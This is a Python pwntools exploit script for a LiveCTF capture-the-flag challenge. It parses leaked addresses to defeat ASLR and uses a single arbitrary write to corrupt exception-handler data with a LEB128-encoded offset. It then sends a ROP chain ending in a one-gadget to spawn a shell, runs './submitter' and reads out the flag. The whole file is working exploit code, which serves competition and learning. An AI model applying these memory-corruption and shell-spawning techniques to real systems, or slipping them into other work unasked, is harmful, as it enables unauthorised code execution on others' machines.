import argparse
import sys
import leb128

from pwn import *

context.terminal = ['tmux', 'splitw', '-v']
context.log_level = 'debug'
context.arch='amd64'


PATH = "./handout/challenge"
# LIBC = "/handout/libc.so.6"
# LD = "/handout/ld-linux-x86-64.so.2"
# e = ELF(PATH)
# libc = ELF(LIBC)

network = len(sys.argv) > 1

if network:
    parser = argparse.ArgumentParser()
    default_addr = os.environ.get("HOST", "127.0.0.1") + ":" + os.environ.get("PORT", "31337")
    parser.add_argument("--network", action='store_true')
    parser.add_argument("address", default=default_addr,
                        nargs="?", help="Address of challenge")
    args = parser.parse_args()
    HOST, PORT = args.address.split(':')

    r = remote(HOST, int(PORT))
else:
    # r = process(PATH)
    r = gdb.debug(PATH, f'''
file {PATH}
c
''')

r.recvuntil(b"main: 0x")
main = int(r.recvuntil(b"\n").strip(), 16)
r.recvuntil(b"var: 0x")
var = int(r.recvuntil(b"\n").strip(), 16)
r.recvuntil(b"printf: 0x")
printf = int(r.recvuntil(b"\n").strip(), 16)

print(f"{main = :x}")
print(f"{var = :x}")
print(f"{printf = :x}")


binary_base = main - 0x14ee
libc_base = printf - 0x60100

eh_addr = binary_base + 0x227f

handler = binary_base + 0x12e0
# jump to gets+6 to skip the first push so we can control the whole stack on exit
gets_plus_five = libc_base + 0x87085

print(f"{binary_base = :#x}")
print(f"{libc_base = :#x}")
print(f"{eh_addr = :#x}")
print(f"{handler = :#x}")
print(f"{gets_plus_five = :#x}")

winning_data = u64(leb128.u.encode(gets_plus_five - handler).ljust(8, b'\x00'))

chain = [
   libc_base + 0x000586e4, # pop rbx ; retn
   0,
   libc_base + 0x000a877e, # pop rcx ; retn
   0,
   libc_base + 0x583f3 # one gadget
]

r.sendlineafter(b"Where to write?", f"{eh_addr:#x}".encode())
r.sendlineafter(b"What to write?", f"{winning_data:#x}".encode())
r.sendlineafter(b"Write again?", f"0 aaaaaaa".encode()+b''.join(p64(x) for x in chain))

r.sendline(b"./submitter")
r.sendline(b'./submitter')
r.sendline(b'./submitter')
r.sendline(b'./submitter')

flag = r.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
